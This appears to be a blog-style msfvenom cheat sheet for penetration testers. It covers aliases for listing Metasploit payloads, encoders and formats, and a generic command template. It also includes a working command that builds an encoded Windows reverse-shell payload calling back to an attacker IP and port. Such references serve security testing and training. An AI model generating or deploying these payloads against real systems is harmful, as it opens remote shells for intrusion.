---
layout: default
title: "The msfvenom cheat sheet"
---
Here are simple msfvenom commands to help in quick payload generation.  

I love the msfvenom aliases that g0tmi1k setup in his [os-scripts](https://github.com/g0tmi1k/os-scripts). These will help in finding the correct payloads, encoders, and formats.  

Place these aliases in ~/.bash_aliases:  

> **`alias msfvenom-list-all='cat ~/.msf4/msfvenom/all'`**  
> **`alias msfvenom-list-nops='cat ~/.msf4/msfvenom/nops'`**  
> **`alias msfvenom-list-payloads='cat ~/.msf4/msfvenom/payloads'`**  
> **`alias msfvenom-list-encoders='cat ~/.msf4/msfvenom/encoders'`**  
> **`alias msfvenom-list-formats='cat ~/.msf4/msfvenom/formats'`**  

Finish the setup by running the following:

> **`mkdir -p ~/.msf4/msfvenom/`**  
> **`msfvenom --list > ~/.msf4/msfvenom/all`**  
> **`msfvenom --list nops > ~/.msf4/msfvenom/nops`**  
> **`msfvenom --list payloads > ~/.msf4/msfvenom/payloads`**  
> **`msfvenom --list encoders > ~/.msf4/msfvenom/encoders`**  
> **`msfvenom --help-formats 2> ~/.msf4/msfvenom/formats`**  

A basic msfvenom command.

> **`msfvenom -p <payload> LHOST=<Your IP> LPORT=<Your Port> -f <format> -e <encoder> -b <bad characters>`**  

A reverse shell example for windows that connects to attacker IP 10.10.10.10 on port 443. This is formatted in c and encode in x86/shikata_ga_nai with bad characters \x00 and \x04.

> **`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x04"`**  

Dont forget that we can build **exe**, **war**, **vbs**, and **asp** executables. Current formats supported by msfvenom are as follows:  

> **`Executable formats`**

>> **`asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war`**  

> **`Transform formats`**

>> **`bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript`**  
